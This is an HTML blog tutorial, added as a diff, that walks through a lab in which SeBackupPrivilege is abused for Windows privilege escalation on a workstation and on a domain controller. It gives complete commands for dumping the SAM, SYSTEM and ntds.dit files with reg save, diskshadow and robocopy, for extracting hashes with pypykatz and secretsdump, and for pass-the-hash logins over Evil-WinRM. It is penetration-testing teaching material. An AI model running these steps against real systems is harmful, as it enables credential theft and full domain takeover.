@@ -1,0 +1,156 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
+            <h1 class="post-title entry-title">Windows Privilege Escalation: SeBackupPrivilege</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" rel="bookmark"><time class="entry-date published" datetime="2021-04-29T16:16:20+00:00">April 29, 2021</time><time class="updated" datetime="2025-05-10T20:29:29+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this article, we will shed light on some of the methods of Escalating Privilege on Windows-based Devices when it is vulnerable with the SeBackupPrivilege after getting the initial foothold on the device.</span></p>
+<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Introduction</strong></span></li>
+<li><span style="color: #000000;"><strong>Setting Up Privilege on Windows 10</strong></span></li>
+<li><span style="color: #000000;"><strong>Testing Privilege on Windows 10</strong></span></li>
+<li><span style="color: #000000;"><strong>Exploiting Privilege on Windows 10</strong></span></li>
+<li><span style="color: #000000;"><strong>Setting Up Privilege on Domain Controller</strong></span></li>
+<li><span style="color: #000000;"><strong>Testing Privilege on Domain Controller</strong></span></li>
+<li><span style="color: #000000;"><strong>Exploiting Privilege on Domain Controller (Method 1)</strong></span></li>
+<li><span style="color: #000000;"><strong>Exploiting Privilege on Domain Controller (Method 2)</strong></span></li>
+<li><span style="color: #000000;"><strong>Conclusion</strong></span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Introduction</strong></span></h3>
+<p><span style="color: #000000;">This specific privilege escalation is based on the act of assigning a user the SeBackupPrivilege. It was designed to allow users to create backup copies of the system. Since it is not possible to make a backup of something that you cannot read. This privilege comes at the cost of providing the user with full read access to the file system. </span><span style="color: #000000;">This privilege must bypass any ACL that the Administrator has placed in the network. So, in a nutshell, this privilege allows the user to read any file on the entirety of the files that might also include some sensitive files.</span></p>
+<p class="" data-start="94" data-end="446"><span style="color: #000000;">Files like the <strong data-start="109" data-end="116">SAM</strong> file or the <strong data-start="129" data-end="139">SYSTEM</strong> registry file are particularly valuable to attackers. Once an attacker gains an initial foothold in the system, they can exploit this access to move up to an elevated shell. They do this by reading the <strong data-start="342" data-end="349">SAM</strong> files and potentially cracking the passwords of high-privilege users on the system or network.</span></p>
+<p class="" data-start="448" data-end="646"><span style="color: #000000;">Furthermore, this article will guide you through setting up the privilege in a VM environment. It will also help you learn and explore this concept in detail before exploiting it using Kali Linux.</span></p>
+<h3><span style="color: #800000;"><strong>Setting Up Privilege on Windows 10</strong></span></h3>
+<p><span style="color: #000000;">We will be performing this demonstration on a Windows 10 machine that is not part of a domain. First, we need to create a user to whom we will be providing the privilege. Creating a user is simple and can be done using the following command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user aarti 123 /add</pre>
+<p class="" data-start="440" data-end="529"><span style="color: #000000;">You can verify the user creation by running the net user command without any options.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-INyMgdRQGyE/YIrW1z_VHkI/AAAAAAAAvpE/7B-dRJtWM8M16sqwgDHIaUR9bhcvyHf2gCLcBGAsYHQ/s16000/1.png"/></span></p>
+<h4>Enabling WinRM and Setting Permissions</h4>
+<p><span style="color: #000000;">Now, to create a realistic scenario, we need to enable WinRM. Since we are going to attack this machine through Kali Linux, and when trying to exploit a Windows Machine. That is the access that we preferentially end up with, we are going to activate it. This can be done by opening PowerShell and enabling the PSRemoting option. Although it is required to set the permissions to run scripts to bypass as demonstrated below. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -ep bypass
+Enable-PSRemoting -Force</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZQB5H6QawMg/YIrXncfaEUI/AAAAAAAAvpM/J9lyX4Pp4skCwpigdCV1lKOKkaxDG-jUgCLcBGAsYHQ/s16000/2.png"/></span></p>
+<h4>Granting Privileges to the New User</h4>
+<p><span style="color: #000000;">Till now, we have created a user and then enabled WinRM on the Target machine. Now for the most important step. We need to provide the privilege to the newly created user. We will be using a Module Named Carbon. Firstly, we need to install the module and then import its objects into the session using the Import-Module option. <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="http://get-carbon.org/">Learn More about Carbon</a>.</strong></span></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Install-Module -Name carbon
+Import-Module carbon</pre>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-QH3D_uNAvww/YIrXrRUWWgI/AAAAAAAAvpQ/47lGeohEE1Y5qKidNrU7WB9c2-Jq3b3mwCLcBGAsYHQ/s16000/3.png" alt="Windows Privilege Escalation using SeBackupPrivilege" width="699" height="164"/></span></p>
+<p><span style="color: #000000;">The <strong data-start="116" data-end="125">Caron</strong> module we just installed includes a variety of different cmdlets. One of these cmdlets is called <strong data-start="223" data-end="243">Grant-CPrivilege</strong>. We will use this cmdlet to give the <strong data-start="281" data-end="302">SeBackupPrivilege</strong> to the <strong data-start="310" data-end="319">aarti</strong> user we just created. To provide the privilege, we need to specify the username of the user for whom we want to enable the privilege. We do this by defining the <strong data-start="481" data-end="493">Identity</strong> parameter. Afterward, we define the <strong data-start="530" data-end="543">Privilege</strong> parameter with <strong data-start="559" data-end="580">SeBackupPrivilege</strong>, as shown in the image below. To verify if the privilege was applied to the user, we use another cmdlet called <strong data-start="692" data-end="711">Test-CPrivilege</strong>. We tested it, and it returned true.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Grant-CPrivilege -Identity aarti -Privilege SeBackupPrivilege
+Test-CPrivilege -Identity aarti -Privilege SeBackupPrivilege</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zlhtNhwl_98/YIrXvMdbaaI/AAAAAAAAvpU/EbI4fY4xdsEdbjBUTGJV70CzYWWU12oXgCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">This concludes the setting up process. Now time to test and exploit this privilege using Evil-WinRM.</span></p>
+<h3><span style="color: #800000;"><strong>Testing Privilege on Windows 10</strong></span></h3>
+<p><span style="color: #000000;">After setting up, it’s time to move to the Kali Linux machine and connect to the target machine through the Evil-WinRM. This process is pretty simple and can be done by typing evil-winrm in the terminal. Then defining parameters -i with the target IP Address, -u with the target username, -p with the password corresponding to that particular user.</span></p>
+<p><span style="color: #000000;">After connecting to the target machine using Evil-WinRM, we can check if the user we logged in has the SeBackupPrivilege. This can be done with the help of the whoami command with the /priv option. It can be observed from the image below that the user aarti has the SeBackupPrivilege.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.1.41 -u aarti –p "123"
+whoami /priv</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yl9wJY-9P6U/YIrXyyOTyEI/AAAAAAAAvpY/soWb_5WCm4UzlS_58XIXO0f39uhesHlZgCLcBGAsYHQ/s16000/5.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploiting Privilege on Windows 10</strong></span></h3>
+<p><span style="color: #000000;">Now, we can start the exploitation of this privilege. As we discussed earlier that this privilege allows the user to read all the files in the system, we will use this to our advantage. To begin, we will traverse to the C:\ directory and then move to create a Temp directory. We can also traverse to a directory with read and write privileges if the attacker is trying to be sneaky. Then we change the directory to Temp. Here we use our SeBackupPrivilege to read the SAM file and save a variant of it. Similarly, we read the SYSTEM file and save a variant of it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd c:\
+mkdir Temp
+reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system</pre>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-P2tQlhOEYCE/YIrX3B6aR_I/AAAAAAAAvpc/8WnIXinanuow6sF9m1qxCdf9SlGUTI3RwCLcBGAsYHQ/s16000/6.png" alt="Windows Privilege Escalation using SeBackupPrivilege" width="677" height="289"/></span></p>
+<h5><strong><span style="color: #000000;">Transferring Files to Kali Linux</span></strong></h5>
+<p><span style="color: #000000;">Now that the Temp directory contains the SAM and SYSTEM files, use the Evil-WinRM download command to transfer these files to your Kali Linux machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd Temp
+download sam
+download system</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-E_qZmwLJAtg/YIrX8v5v9EI/AAAAAAAAvpk/UilsXEy-nZMLXp-Hr9cNfeN3LjOGJvyaACLcBGAsYHQ/s16000/7.png"/></span></p>
+<h5><strong><span style="color: #000000;">Extracting Hashes with Pypykatz and Gaining Access</span></strong></h5>
+<p><span style="color: #000000;">Now, we can extract the hive secrets from the SAM and SYSTEM files using the pypykatz. If not present on your Kali Linux, you can download it from its <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/skelsec/pypykatz">GitHub</a></span></strong>. It is a variant of Mimikatz cooked in Python. So, we can run its registry function and then use the –sam parameter to provide the path to the SAM and SYSTEM files. As soon as the command run, we can see in the demonstration below that we have successfully extracted the NTLM hashes of the Administrator account and other users as well.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">pypykatz registry --sam sam system</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-P0ODAEbgYOY/YIrYAmb70bI/AAAAAAAAvps/ycB6eBnYeUoocNjoZmVHotvt6wlWAYoUACLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">Now, we can use the NTLM Hash of the raj user to get access to the target machine as a raj user. We again used Evil-WinRM to do this. After connecting to the target machine, we run net user to see that raj user is a part of the Administrator group. This means we have successfully elevated privilege over our initial shell as the aarti user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.1.41 -u raj -H "##Hash##"
+net user raj</pre>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-ALj13aowbjs/YIrYEnaVugI/AAAAAAAAvpw/gR5rHFhvn0sDPQKFdHv80l-08HtJbNE9gCLcBGAsYHQ/s16000/10.png" alt="Windows Privilege Escalation using SeBackupPrivilege" width="695" height="569"/></span></p>
+<p><span style="color: #000000;">You can also use the Administrator NTLM hash and log in directly by Evil-WinRM. This is demonstrated below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.1.41 -u administrator -H "##Hash##"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fsWv07DsfQ4/YIrYICjRsDI/AAAAAAAAvp4/1i4IfexQKCoRELZI3sFNqs8KD_TKMHOkACLcBGAsYHQ/s16000/11.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Setting Up Privilege on Domain Controller</strong></span></h3>
+<p><span style="color: #000000;">To set up the SeBackupPrivilege on a Domain Controller is slightly different than doing so on Windows 10. To begin with, we need to create a new user whom we will apply the privilege. This can be done from the Server Manager Window on a Domain Controller. In the Tools Menu, you can find Active Directory Users and Computers. Now, Right-click on the domain and choose the New option from the drop-down menu. It will create another menu, choose User from that menu as depicted in the screenshot below.  </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-V26jJOUb-Xk/YIrYL5h7TnI/AAAAAAAAvp8/jtKPrZXOBDQ-GWHml2-IwnGEGsx9YRjfwCLcBGAsYHQ/s16000/44.png"/></span></p>
+<p><span style="color: #000000;">This will open a new window, New Object-User, to define the user parameters. We name the user as ignite with the User logon name as ignite@ignite.local. Click on the Next button, you will be prompted to create a password for this user.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-ejhGwIU4QTE/YIrYQbF7uLI/AAAAAAAAvqE/te8GmO6Rm-4iByFgwJtuVhxaochcJ8kRACLcBGAsYHQ/s16000/45.png" alt="Windows Privilege Escalation using SeBackupPrivilege" width="438" height="374"/></span></p>
+<p><span style="color: #000000;">After creating a password for the Ignite user. You will notice that there is a new entry in the middle of Active Directory Users and Computers by the name of “ignite”. Corresponding to the user we just created, as shown in the image below. Right-click on the ignite user and choose to Add to a group from the drop-down menu.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vkvmG7hxwEw/YIrYWtc1gAI/AAAAAAAAvqM/G2FWQD_g2DctCQbbUo5VsRvBq_WrpBUVQCLcBGAsYHQ/s16000/46.png"/></span></p>
+<p><span style="color: #000000;">This will open a new window to select the Group for the Ignite user. We make the Ignite user a part of the Backup Operators Group. After adding the name of the group, click on the OK button, and now we are done setting up the SeBackupPrivilege on the Domain Controller for the ignite user.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1HKgHg-tTrE/YIrYbFLTVJI/AAAAAAAAvqU/29xXr1mLMusT0JpZvLANtknyTNYzkU_iACLcBGAsYHQ/s16000/47.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Testing Privilege on Domain Controller</strong></span></h3>
+<p><span style="color: #000000;">To test if the ignite user has the SeBackupPrivilege, we connect to the target machine using the Evil-WinRM.  After connecting, we use the whoami /priv command as before to check the privileges of the ignite user. We can observe from the image below that indeed the user ignite has the SeBackupPrivilege and SeRestorePrivilege enabled.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.1.172 -u ignite –p "Password@1"
+whoami /priv</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-JZNW6_HyU3w/YIrYfhaj5AI/AAAAAAAAvqY/r6T-8oQFxMYF8EneTjODXUKhZiUhblSAwCLcBGAsYHQ/s16000/50.png" alt="Windows Privilege Escalation using SeBackupPrivilege" width="682" height="324"/> </span></p>
+<p><span style="color: #000000;">Before moving on to Exploitation, let us explain why there is a difference in the methodology of exploitation between a Domain Controller and a Windows Machine. This is because, in the case of a DC, the privilege only allows you to make backups, not copies. In a standalone system, we can make copies of the files that we discussed in the first portion of our article. In the case of DC, the method differs as now we need to make backups of the SAM and SYSTEM files, or any other sensitive files, to extract the password hash of users. There are two methods to make this kind of backup.</span></p>
+<h3><span style="color: #800000;"><strong>Exploiting Privilege on Domain Controller (Method 1).</strong></span></h3>
+<p class="" data-start="113" data-end="812"><span style="color: #000000;">Now that we have a clear understanding of the process we are about to perform, let’s move ahead. Unlike standalone exploitation, extracting hashes from a Domain Controller requires the <strong data-start="298" data-end="310">ntds.dit</strong> file along with the system hive. However, the <strong data-start="357" data-end="369">ntds.dit</strong> file presents a challenge. When the target machine is running, the file remains in use, which makes it impossible to copy using conventional methods. As we know, when a file is in use, it is typically locked by the operating system, preventing direct access. Therefore, to bypass this restriction, we need to use the <strong data-start="687" data-end="701">diskshadow</strong> functionality. This built-in Windows feature allows us to create a copy of a drive that is currently in use.</span></p>
+<h5><strong><span style="color: #000000;">Creating the Distributed Shell (DSH) File</span></strong></h5>
+<p class="" data-start="814" data-end="1270"><span style="color: #000000;">There are different methods to use <strong data-start="849" data-end="863">DiskShadow</strong>, including providing instructions directly in a DiskShadow shell. However, this approach can be a bit tricky and error-prone. To simplify the process, we will create a Distributed Shell File (<strong data-start="1056" data-end="1063">dsh</strong> file). This file will contain all the commands required by <strong data-start="1123" data-end="1137">DiskShadow</strong> to run and create a complete copy of our Windows drive. Once this copy is created, we can use it to extract the <strong data-start="1250" data-end="1262">ntds.dit</strong> file.</span></p>
+<p class="" data-start="1272" data-end="1838"><span style="color: #000000;">Next, we move to our Kali Linux shell and create a <strong data-start="1323" data-end="1330">dsh</strong> file using the editor of our choice. In this file, we instruct <strong data-start="1394" data-end="1408">DiskShadow</strong> to create a copy of the <strong data-start="1433" data-end="1439">C:</strong> drive and map it to a <strong data-start="1462" data-end="1468">Z:</strong> drive, using <strong data-start="1482" data-end="1489">raj</strong> as its alias. Of course, the drive alias and character can be customized to your preference. After creating this <strong data-start="1603" data-end="1610">dsh</strong> file, the next step is to use the <strong data-start="1645" data-end="1657">unix2dos</strong> command. This step is crucial because it converts the encoding and spacing of the <strong data-start="1740" data-end="1747">dsh</strong> file to a format that is compatible with the Windows machine, ensuring seamless execution.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano raj.dsh
+set context persistent nowriters
+add volume c: alias raj
+create
+expose %raj% z:
+unix2dos raj.dsh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8MHh-9qtqow/YIrYklZVtrI/AAAAAAAAvqc/rxxCFYkKbQQsHc5mojz8xPwVgp3uNvI1gCLcBGAsYHQ/s16000/51.png"/></span></p>
+<h5><strong><span style="color: #000000;">Transferring and Executing the DSH File</span></strong></h5>
+<p><span style="color: #000000;">Back to the WinRM Session, we move to the Temp Directory and upload the raj.dsh file to the target machine. Then, we use the diskshadow with dsh script as shown in the image below. If observed, it can be noticed that diskshadow is indeed executing the same commands that we entered in the dsh file sequentially. After running, as discussed, it will create a copy of the C drive on the Z drive. Now, we can use the RoboCopy tool to copy the file from the Z Drive to the Temp Directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd C:\Temp
+upload raj.dsh
+diskshadow /s raj.dsh
+robocopy /b z:\windows\ntds . ntds.dit</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-SzATd7-aqJY/YIrYypJK2YI/AAAAAAAAvqs/kqCqi8H4tqQgCXLwwpK_X3BKh6rSKURIgCLcBGAsYHQ/s16000/52.png" alt="Windows Privilege Escalation using SeBackupPrivilege" width="747" height="828"/></span></p>
+<p><span style="color: #000000;">We are now in possession of the ntds.dit file, and we need to extract the system hive. This can be done with a simple reg save command as demonstrated in the image below. With now both ntds.dit file and the system hive file in the Temp directory, we now use the download command to transfer both of these files to our Kali Linux.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">reg save hklm\system c:\Temp\system
+cd C:\Temp
+download ntds.dit
+download system</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-S0gu6YGutC4/YIrY3Gs2wkI/AAAAAAAAvq0/FFbshMnrgJwtTJ7f2w4qVjjKc8hBnqFZACLcBGAsYHQ/s16000/53.png"/></span></p>
+<h5><span style="color: #000000;"><strong>Extracting Hashes and Gaining Access</strong></span></h5>
+<p><span style="color: #000000;">On our Kali Linux shell, we can use the secretsdump script that is a part of the Impacket Framework to extract our hashes from the ntds.dit file and the system hive. It can be observed from the image below that the hashes for the Administrator account have been successfully extracted.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-secretsdump -ntds ntds.dit -system system local</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-TE4RLksHu10/YIrY77NlkrI/AAAAAAAAvq8/j7bYTr-alAcx2kc6jjb7ZLZ2_ya8SUNHwCLcBGAsYHQ/s16000/54.png" alt="Windows Privilege Escalation using SeBackupPrivilege" width="729" height="481"/></span></p>
+<p><span style="color: #000000;">We can now use the Evil-WinRM to log in as the Administrator account using its hash. This is how we can elevate our privilege on the Windows Domain Controller.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.1.172 -u administrator -H "##Hash##"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EZ_aGneezo8/YIrZAuTyvbI/AAAAAAAAvrA/sYRLzS_c--4D0la7_Irnpfu3tiNhBzy0wCLcBGAsYHQ/s16000/55.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploiting Privilege on Domain Controller (Method 2)</strong></span></h3>
+<p><span style="color: #000000;">This method requires 2 Dynamic Link Library (DLL) files that will help us create backups of the ntds.dit and system files. These DLL files can be downloaded from this <a style="color: #000000;" href="https://github.com/giuliano108/SeBackupPrivilege">GitHub</a> repository. We will be needing the SeBackupPrivilegeUtils.dll and SeBackupPrivilegeCmdLets.dll files on our Kali Linux. We will use the Evil-WinRM session that we already have to transfer the DLL files and the DSH file that we created in the previous method to the Target Machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd C:\Temp
+upload raj.dsh
+upload SeBackupPrivilegeUtils.dll
+upload SeBackupPrivilegeCmdLets.dll</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qVCdX40I9RI/YIrZFK4fUNI/AAAAAAAAvrI/-LoT2-FxBNEROlhQonwgmyokQsmFTVXJwCLcBGAsYHQ/s16000/60.png"/></span></p>
+<h5><strong><span style="color: #000000;">Creating the Backup</span></strong></h5>
+<p><span style="color: #000000;">Now, as these are the DLL files, to use them, we need to Import them into Memory. This can be done using the Import-Module cmdlet. Now as we did in the previous method, we need to use diskshadow with the raj.dsh file to create a backup of the C Drive [Windows Installation Drive] on the Target System.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+diskshadow /s raj.dsh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-U1eq-QA86ZQ/YIrZMVeBwSI/AAAAAAAAvrQ/TWZYRWqQJrgL7bYJblH2N-x2TfbEB84NACLcBGAsYHQ/s16000/61.png"/></span></p>
+<p><span style="color: #000000;">Now that we have successfully created a backup, we can use it to extract the ntds.dit file and the system file. Unlike the previous method, this time we will be using the Copy-FileSebackupPrivilege cmdlet to copy the ntds.dit file from the Z volume to the Temp Directory. The Copy-FileSebackupPrivilege cmdlet is a part of the DLL files that we imported earlier. We will use the reg save command to copy the system file to the Temp Directory as well. After ensuring that both files have been successfully copied to the Temp, we will use the download feature of Evil-WinRM to transfer the files from the Evil-WinRM shell of the Domain Controller to Kali Linux.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
+reg save hklm\system c:\Temp\system
+cd C:\Temp
+download ntds.dit
+download system</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-Rf7CaLK8wek/YIrZQzRU85I/AAAAAAAAvrU/WrmPkplhvhAnlpL7lkQ2jDHVcr7Iw34rwCLcBGAsYHQ/s16000/62.png" alt="Windows Privilege Escalation using SeBackupPrivilege" width="975" height="506"/></span></p>
+<h5><span style="color: #000000;"><strong>Extracting Hashes and Gaining Access</strong></span></h5>
+<p><span style="color: #000000;">After the successful transfer, we will use the secretsdump script of Impacket to extract the hashes from the ntds.dit file and the system file. We can see that it has successfully extracted all the hashes.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-secretsdump -ntds ntds.dit -system system local</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hkERbBOKwRo/YIrZVwi4clI/AAAAAAAAvrY/WKaYItWZ4FYR2-f3fikYO1T5B_VGB602QCLcBGAsYHQ/s16000/63.png"/></span></p>
+<p><span style="color: #000000;">As before, we can use the Administrator hashes to log in on the Target Machine with Administrative or Elevated Access as shown in the image below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.1.172 -u administrator -H "##Hash##"</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-1JuXSY1v4QY/YIrZauwtAXI/AAAAAAAAvrc/n1SylchQB10cKCxQiKSxJUjZFV1RpFy_ACLcBGAsYHQ/s16000/64.png" alt="Windows Privilege Escalation using SeBackupPrivilege" width="766" height="172"/></span></p>
+<h3><span style="color: #800000;"><strong>Conclusion</strong></span></h3>
+<p><span style="color: #000000;">The point that we are trying to convey through this article is. It is that there are multiple methods to consider while elevating Privileges on Windows-based devices. If your initial foothold has the SeBackupPrivilege. We wanted this article to serve as your go-to guide whenever you are trying to elevate privilege on a Windows machine using the SeBackupPrivilege.</span></p>
+<p><span style="color: #000000;">To learn more about Windows Privilege Escalation. Follow this</span> <strong><a href="https://www.hackingarticles.in/tag/windows-privilege-escalation/">Link.</a></strong></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
